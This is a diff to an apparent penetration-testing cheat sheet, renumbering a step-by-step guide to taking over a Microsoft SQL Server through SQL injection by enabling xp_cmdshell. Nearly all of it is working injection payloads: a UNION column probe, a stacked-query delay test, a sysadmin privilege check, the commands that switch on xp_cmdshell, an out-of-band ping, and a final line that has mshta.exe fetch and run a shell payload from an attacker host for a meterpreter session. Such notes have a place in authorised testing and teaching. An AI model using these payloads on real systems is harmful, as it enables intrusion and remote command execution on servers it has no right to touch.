@@ -59,30 +59,30 @@
             ```
 
         - MSSQL - xp_cmdshell (https://medium.com/@alokkumar0200/owning-a-machine-using-xp-cmdshell-via-sql-injection-manual-approach-a380a5e2a340)
-            - Finding Number of Columns in database.
+            1. Finding Number of Columns in database.
             ```
             admin' UNION SELECT 1,2,3,4,5--+
             ```
-            - Check if we can run stack queries. (This should bring a delay of 8 seconds in response.)
+            2. Check if we can run stack queries. (This should bring a delay of 8 seconds in response.)
             ```
             admin' UNION SELECT 1,2,3,4,5; WAITFOR DELAY '0:0:8'--+
             ```
-            - Below query can be used to check our privileges if we can enable xp_cmdshell via SQL Injection (Result of above query should be 1)
+            3. Below query can be used to check our privileges if we can enable xp_cmdshell via SQL Injection (Result of above query should be 1)
             ```
             admin' UNION SELECT 1,is_srvrolemember('sysadmin'),3,4,5--+
             ```
-            - Below queries will configure xp_cmdshell for us.
+            4. Below queries will configure xp_cmdshell for us.
             ```
             admin' UNION SELECT 1,2,3,4,5; EXEC sp_configure 'show advanced options', 1--+
             admin' UNION SELECT 1,2,3,4,5; RECONFIGURE--+
             admin' UNION SELECT 1,2,3,4,5; EXEC sp_configure 'xp_cmdshell', 1--+
             admin' UNION SELECT 1,2,3,4,5; RECONFIGURE--+
             ```
-            - Check if we can execute OS commands or not. Let’s ping our Burp Collaborator, query should give us a DNS request on Burp Collaborator. (ngrok can also be used if you don’t have Burp Suite Professional).
+            5. Check if we can execute OS commands or not. Let’s ping our Burp Collaborator, query should give us a DNS request on Burp Collaborator. (ngrok can also be used if you don’t have Burp Suite Professional).
             ```
             admin' UNION SELECT 1,2,3,4,5; EXEC xp_cmdshell 'ping <collab_url>.burpcollaborator.net'--+
             ```
-            - Getting Shell
+            6. Getting Shell
                 - Created a meterpreter staged payload using msfvenom and hosted it on local server which will finally land us to the SHELL. And started listener on metasploit. Using below query to get the our payload from local server and execute it on victim’s machine.
             ```
             admin' UNION SELECT 1,2; EXEC xp_cmdshell 'mshta.exe http://<attacker_IP>:8000/shell.hta'--+
